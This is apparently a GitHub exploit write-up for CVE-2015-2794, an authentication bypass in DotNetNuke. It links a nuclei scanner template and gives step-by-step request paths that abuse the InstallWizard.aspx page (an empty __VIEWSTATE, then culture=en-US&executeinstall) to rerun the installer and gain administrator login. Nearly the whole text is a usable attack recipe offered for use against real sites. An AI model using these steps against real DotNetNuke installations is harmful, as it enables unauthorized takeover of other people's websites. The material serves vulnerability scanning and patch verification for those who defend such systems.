# Exploit Title: DotNetNuke Administration Authentication Bypass

templates

https://github.com/projectdiscovery/nuclei-templates/blob/fcd3d55a60c8d8b61395e6056e83a6b08268cc11/http/cves/2015/CVE-2015-2794.yaml

Step 1: /Install/InstallWizard.aspx?__VIEWSTATE=

Step 2: Fill all infor

Step 3: CLick continue if it don't work, just add &culture=en-US&executeinstall

or you get any error ex: 500,... just removing __VIEWSTATE=

Install/InstallWizard.aspx?culture=en-US&executeinstall

Step 4: Login /Home/tabid/36/ctl/Login/Default.aspx

![454444](https://github.com/Kro0oz/-DotNetNuke-Administration-Authentication-Bypass/assets/72355033/5d5c8f9c-0833-4e18-b7be-365643379080)
